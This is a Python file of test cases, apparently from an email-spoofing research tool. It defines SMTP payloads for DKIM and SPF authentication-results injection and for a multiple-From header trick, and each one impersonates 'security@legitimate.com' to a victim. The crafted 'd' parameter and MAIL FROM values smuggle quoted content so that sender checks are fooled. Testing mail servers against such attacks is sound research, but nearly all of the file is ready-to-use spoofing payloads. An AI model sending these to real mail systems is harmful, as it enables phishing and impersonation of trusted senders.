from common.common import *

test_cases = {
    "case_a4": { # An example of DKIM authentication injection attack
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <security@legitimate.com>"},
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_a7": { # A example of SPF authentication results injection attack
        "helo": b"attack.com",
        "mailfrom": b"<@legitimate.com,@any.com:'any@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: fake subject here\r\n",
            "body": b"Hi, fake body here.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
    "case_b1": { # Multiple from
        "helo": b"attack.com",
        "mailfrom": b"<@legitimate.com,@any.com:'any@a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <security@legitimate.com>,\r\n\t<a@b>,<c@d>\r\n",
            #"from_header": b"From: <security@legitimate.com>\r\nFrom: <security2@legitimate.com>\r\n",
            #"from_header": b"From: <security@legitimate.com>\r\nSender: <security@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: Multiple from\r\n",
            "body": b"Hi, fake body here.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nlast:value\r\n\r\n',
        }
    },
}
